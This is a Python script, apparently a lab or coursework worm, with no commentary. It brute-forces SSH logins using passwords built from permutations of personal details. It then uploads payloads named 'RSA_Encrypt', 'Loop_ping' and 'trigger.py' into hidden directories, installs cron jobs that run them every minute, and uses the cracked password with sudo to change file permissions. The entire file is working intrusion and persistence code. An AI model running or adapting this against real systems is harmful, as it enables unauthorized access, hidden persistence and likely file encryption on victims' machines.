#!/usr/bin/python3
import paramiko
from itertools import permutations
import sys
import time

local_ip = sys.argv[1]

attacker_info = ['YueHan', 'Wang', 'YH', '1999', '0228', 'oscar', 'Realtek', '@', '_']
info_pair = list(permutations(attacker_info, 2))
attack_dict = []
for pair in info_pair:
    attack_dict.append(str(pair[0] + pair[1]))

for key in attack_dict:
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(hostname = local_ip, port =  22, username =  'attacker', password = key)
    except paramiko.ssh_exception.AuthenticationException as e:
        ssh.close()
        continue
    else:
        correct_key = key
        break

stdio, stdout, stderr = ssh.exec_command('mkdir -p /home/attacker/Public/.Simple_Worm')
stdio, stdout, stderr = ssh.exec_command('mkdir -p /home/attacker/Desktop/.Backup')
if ssh != None:
    ssh.close()
    del ssh, stdio, stdout, stderr

transport = paramiko.Transport((local_ip, 22))
transport.connect(username = 'attacker', password = correct_key)
sftp = paramiko.SFTPClient.from_transport(transport)
sftp.chdir('/home/attacker/Public/.Simple_Worm')
sftp.put('RSA_Encrypt', 'RSA_Encrypt')
sftp.put('Loop_ping', 'Loop_ping')
sftp.put('trigger.py', 'trigger.py')
sftp.chdir('/home/attacker/Desktop/.Backup')
sftp.put('RSA_Encrypt', 'RSA_Encrypt')
sftp.put('Loop_ping', 'Loop_ping')
sftp.put('trigger.py', 'trigger.py')
sftp.close()

ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
ssh.connect(hostname = local_ip, port =  22, username = 'attacker', password = correct_key)
stdio, stdout, stderr = ssh.exec_command('crontab -l > /tmp/current1.cron', timeout = 2)
time.sleep(2)
stdio, stdout, stderr = ssh.exec_command('echo "* * * * * /usr/bin/python3 /home/attacker/Public/.Simple_Worm/trigger.py" >> /tmp/current1.cron', timeout = 2)
time.sleep(2)
stdio, stdout, stderr = ssh.exec_command('crontab /tmp/current1.cron', timeout = 2)
time.sleep(2)

stdio, stdout, stderr = ssh.exec_command('crontab -l > /tmp/current2.cron', timeout = 2)
time.sleep(2)
stdio, stdout, stderr = ssh.exec_command('echo "* * * * * /usr/bin/python3 /home/attacker/Desktop/.Backup/trigger.py" >> /tmp/current2.cron', timeout = 2)
time.sleep(2)
stdio, stdout, stderr = ssh.exec_command('crontab /tmp/current2.cron', timeout = 2)
time.sleep(2)

cmd1 =  'echo "' + correct_key + '" | sudo -S chmod 777 /home/attacker/Desktop/.Backup/trigger.py /home/attacker/Desktop/.Backup/RSA_Encrypt /home/attacker/Desktop/.Backup/Loop_ping'
cmd2 =  'echo "' + correct_key + '" | sudo -S chmod 777 /home/attacker/Public/.Simple_Worm/trigger.py /home/attacker/Public/.Simple_Worm/RSA_Encrypt /home/attacker/Public/.Simple_Worm/Loop_ping'
stdio, stdout, stderr = ssh.exec_command(cmd1, timeout = 2)
time.sleep(3)
stdio, stdout, stderr = ssh.exec_command(cmd2, timeout = 2)
time.sleep(3)

if ssh != None:
    ssh.close()
    del ssh, stdio, stdout, stderr